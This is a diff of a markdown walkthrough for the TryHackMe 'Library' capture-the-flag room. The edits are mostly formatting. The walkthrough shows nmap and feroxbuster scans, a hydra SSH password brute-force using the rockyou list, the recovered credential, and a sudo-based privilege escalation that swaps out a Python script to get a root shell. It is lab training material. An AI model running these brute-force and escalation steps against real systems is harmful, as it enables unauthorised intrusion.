@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: boot2root machine for FIT and bsides guatemala CTF
 ```
+
 Room link: [https://tryhackme.com/r/room/bsidesgtlibrary](https://tryhackme.com/r/room/bsidesgtlibrary)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/bsidesgtlibrary](https://tryhackme.com/
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
 └─$ nmap -v -sV -sC 10.10.181.145
@@ -79,7 +83,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.46 seconds
 ```
+
 We have two services running:
+
 - OpenSSH 7.2p2 on port 22
 - Apache httpd 2.4.18 on port 80
 
@@ -88,6 +94,7 @@ We have two services running:
 Manually browsing to port 80 shows a blog named `boot2root machine for FIT and bsides Guatemala`.  
 There is one blog post called `This is the title of a blog post` made by the user `meliodas`.  
 There is also the option to post comments and 3 comments have already been made by:
+
 - root
 - www-data
 - Anonymous
@@ -95,10 +102,11 @@ There is also the option to post comments and 3 comments have already been made 
 ### Check for files/directories with feroxbuster
 
 Next, we check for files/directories on the web service with `feroxbuster`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
 └─$ feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -C 404 -x html,php,txt -u http://10.10.181.145
-                                                                                                                                                                                          
+
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
@@ -137,17 +145,20 @@ by Ben "epi" Risher 🤓                 ver: 2.10.4
 ```
 
 The most interesting we found was a robots.txt file that we should look into
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
 └─$ curl http://10.10.181.145/robots.txt             
 User-agent: rockyou 
 Disallow: /   
 ```
-This hints to brute-forcing passwords...
+
+This hints to brute-forcing passwords with the rockyou dictionary...
 
 ### Bruteforce meliodas SSH password
 
 Let's try to find `meliodas` SSH password with `hydra`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
 └─$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.181.145 ssh                
@@ -165,12 +176,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 12:11:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 12:13:29
 ```
+
 And the password is `iloveyou1`.
 
 ### Login with SSH
 
 Now we can login as `meliodas` with SSH
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Library]
 └─$ ssh meliodas@10.10.181.145    
 The authenticity of host '10.10.181.145 (10.10.181.145)' can't be established.
@@ -191,6 +204,7 @@ meliodas@ubuntu:~$
 ### Get the user flag
 
 Next, we can search for the user flag
+
 ```bash
 meliodas@ubuntu:~$ ls -la
 total 40
@@ -213,6 +227,7 @@ meliodas@ubuntu:~$ cat user.txt
 
 We start enumerating for ways to escalate our privileges.  
 The previous found `bak.py` might be interesting
+
 ```bash
 meliodas@ubuntu:~$ cat bak.py 
 #!/usr/bin/env python
@@ -229,7 +244,9 @@ if __name__ == '__main__':
     zipdir('/var/www/html', zipf)
     zipf.close()
 ```
+
 And we should also check `sudo -l` because of the file `.sudo_as_admin_successful`
+
 ```bash
 meliodas@ubuntu:~$ sudo -l
 Matching Defaults entries for meliodas on ubuntu:
@@ -242,6 +259,7 @@ User meliodas may run the following commands on ubuntu:
 ### Privilege escalation
 
 We can't edit the `bak.py` file but we can create a new file
+
 ```bash
 meliodas@ubuntu:~$ rm bak.py
 rm: remove write-protected regular file 'bak.py'? yes
@@ -251,11 +269,13 @@ root@ubuntu:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@ubuntu:~# 
 ```
+
 Excellent, we are root.
 
 ### Get the root flag
 
 Finally, we locate and cat the root flag
+
 ```bash
 root@ubuntu:/root# ls -la
 total 28
